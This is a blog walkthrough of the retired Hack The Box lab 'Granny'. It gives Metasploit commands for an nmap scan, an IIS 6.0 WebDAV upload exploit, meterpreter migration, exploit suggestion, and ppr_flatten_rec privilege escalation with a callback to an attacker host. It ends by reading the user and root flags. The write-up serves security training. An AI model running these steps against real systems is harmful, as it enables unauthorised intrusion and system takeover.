<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Granny Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-granny-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-04-02T16:19:41+00:00">April 2, 2018</time><time class="updated" datetime="2025-07-06T18:23:02+00:00">July 6, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “<strong>Granny</strong>” which is categories as retired lab presented by <strong>Hack the Box</strong> for making online penetration practices. Challenges in this lab are not hard to complete although they are like a brain teaser for the beginner as well as for expert penetration tester too. </span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file on the victim’s machine.</span></p>
<h3><span style="color: #800000;">Initial Reconnaissance and Service Identification</span></h3>
<p><span style="color: #000000;">Since these labs are online accessible therefore they have static IP. The IP of Granny is <strong>10.10.10.15</strong> so let’s initiate with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.15</pre>
<p><span style="color: #000000;">From the given below image, you can observe we found port 80 is open and Microsoft IIS 6.0 is running in victim’s network.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-kUeRsJQfPi8/WsJQoGcFOVI/AAAAAAAAV_U/3dR-IgoacSENAHybml9MQf_CPy-4ylWCwCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Significant port 80 is open in the victim’s network we preferred to explore his IP in the browser and resulting web page is shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rY9yh96NUzc/WsJQorpWdJI/AAAAAAAAV_k/-7KUyQqmf3Eta3QDBDRlbZIeHQZJXI18gCEwYBhgL/s1600/2.png"/></span></p>
<h3><span style="color: #800000;">Exploiting IIS WebDAV Vulnerability</span></h3>
<p><span style="color: #000000;">Since we know Microsoft IIS httpd 6.0 is running in victims system therefore when I Google I found Rapid 7 exploit for this as highlighted in given below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-KeXCXTmPauI/WsJQo85AN4I/AAAAAAAAV_k/ZvtxBilGOSkoYmmBYsYhawN0WQwRTToqACEwYBhgL/s1600/3.1.png"/></span></p>
<p><span style="color: #000000;">Without wasting time I open a new terminal and type msfconsole for loading Metasploit framework and use module iis_webdav for exploiting targets system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/iis/iis_webdav_upload_asp
msf exploit(windows/iis/iis_webdav_upload_asp) &gt;set rhost 10.10.10.15
msf exploit(windows/iis/iis_webdav_upload_asp) &gt;run</pre>
<p><span style="color: #000000;">From given below image you can observe meterpreter shell session1 opened for accessing victim tty shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ta0dkIIpIoI/WsJQo2SiujI/AAAAAAAAV_Y/gglUJwDXgtE-Z_u0WUPAu9Vkke_xFSbbQCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Every time my meterpreter session get died therefore I go post exploitation for migrating current process into another process by executing the following module.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/manage/migrate
msf post(windows/manage/migrate)&gt;set session 1
msf post(windows/manage/migrate)&gt; run</pre>
<p><span style="color: #000000;">Above module will migrate a Meterpreter session from one process to another. A given process PID to migrate to or the module can spawn one and migrate to that newly spawned process.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-NXFVsIk7VLE/WsJQpMQ4RRI/AAAAAAAAV_U/rJfRsIoJWSos-P7aH2_u5476L6tdj9whQCEwYBhgL/s1600/4.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation via Exploit Suggester</span></h3>
<p><span style="color: #000000;">Then I run a post exploit “Multi Recon Local Exploit Suggester” that suggests local meterpreter exploits that can be used for the further exploit. The exploits are recommended founded on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) &gt; set session 1
msf post(multi/recon/local_exploit_suggester) &gt; exploit</pre>
<p><span style="color: #000000;"><strong>Wonderful!!</strong> Exploit Suggester truly proof itself by suggesting another exploit name to which target is vulnerable. So now we will go with the last option as highlighted in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-uSjmI2RQ9u4/WsJQpgnRIrI/AAAAAAAAV_U/prr2kJOoYfUlnUgfquJ1ziMR0fWyNJvpQCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">At this time use pprFlattenRec Local Privilege Escalation module for making unauthorized access again but as privileged user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ppr_flatten_rec
msf exploit(windows/local/ppr_flatten_rec) &gt;set session 1
msf exploit(windows/local/ppr_flatten_rec) &gt;set wait 20
msf exploit(windows/local/ppr_flatten_rec) &gt; set lhost 10.10.14.6
msf exploit(windows/local/ppr_flatten_rec) &gt; exploit</pre>
<p><span style="color: #000000;"><strong>Nice!!</strong> It works and we got meterpreter session 2 as system user and you can check in below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-DnvN3WdEvcA/WsJQp6IOQUI/AAAAAAAAV_c/fG5cFIJPQl0q-lnsKndgKNts-Y4LhM1lgCEwYBhgL/s1600/6.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; getuid</pre>
<h3><span style="color: #800000;">Capturing User and Root Flags</span></h3>
<p><span style="color: #000000;">As we have a tty shell that has system privileges, let’s complete this task by searching for the user.txt and root.txt flags, which someone hid somewhere inside a directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; ls</pre>
<p><span style="color: #000000;">Here we found Document and setting let’s explore</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-MQlNr24YMgI/WsJQpni0JfI/AAAAAAAAV_M/tOPmdDAx2B4CnG7iqWknUzwQtHbr4U5bwCEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Inside <strong>C:\Document and Setting\Lakis\Desktop</strong> I found the<strong> user.txt</strong> file and used the type “filename” command for reading this file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Lakis/Desktop
cat user.txt</pre>
<p><span style="color: #000000;"><strong>Great!!</strong> We got our 1<sup>st</sup> flag successfully</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Ank_yXjYaZI/WsJQoDqH45I/AAAAAAAAV_k/sPNw5Gi0gccDy4G7SqkLypm7n1h2Cq6OwCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Inside <strong>C:\Document and Setting\Administrtator\Desktop</strong> I found the <strong>root.txt</strong> file and used the type “filename” command for reading this file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Administrator/Desktop
cat root.txt</pre>
<p><span style="color: #000000;"><strong>Great!!</strong> We got our 2nd flag successfully</span></p>
<p><span style="color: #000000;">Breaching this lab was an interesting and enjoyable moment for me. It will take less time if you are aware of proper Metasploit exploits. Therefore I will give all <strong>Glory to Metasploit</strong> for making this challenge easy for me.</span></p>
<p><span style="color: #000000;"><strong>Happy Hacking!!</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NDzZ7FXV3R8/WsJQn2Oi6xI/AAAAAAAAV_c/5Bx0d4fXg0YN6fzAESB6pvr_7BriK8kcACEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
